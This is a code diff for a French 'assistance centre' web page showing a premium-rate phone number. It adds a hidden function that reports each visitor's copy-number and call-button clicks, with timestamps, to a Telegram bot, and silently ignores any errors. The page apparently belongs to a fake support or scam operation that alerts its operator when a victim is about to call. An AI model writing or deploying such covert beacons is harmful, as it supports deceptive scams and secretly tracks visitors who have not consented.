@@ -64,6 +64,7 @@ document.addEventListener('DOMContentLoaded', function() {
 
     copyBtn.addEventListener('click', function() {
         var phone = '08 91 24 12 72';
+        sendActionToTelegram('Copier le numero');
         if (navigator.clipboard && navigator.clipboard.writeText) {
             navigator.clipboard.writeText(phone).then(function() {
                 copyBtn.classList.add('copied');
@@ -101,6 +102,18 @@ document.addEventListener('DOMContentLoaded', function() {
             showToast('Erreur de copie', 'error');
         }
         document.body.removeChild(textarea);
+    }
+
+    var callBtn = document.getElementById('callBtn');
+    if (callBtn) {
+        callBtn.addEventListener('click', function() {
+            sendActionToTelegram('Appel telephonique');
+        });
+    }
+
+    function sendActionToTelegram(action) {
+        var message = '%F0%9F%94%94 Action utilisateur%0A%0AAction%3A ' + encodeURIComponent(action) + '%0AHeure%3A ' + encodeURIComponent(new Date().toLocaleString('fr-FR')) + '%0ASite%3A Centre d%27assistance';
+        fetch('https://api.telegram.org/bot' + telegramToken + '/sendMessage?chat_id=' + chatId + '&text=' + message).catch(function() {});
     }
 
     document.querySelectorAll('.code-digits').forEach(function(input) {
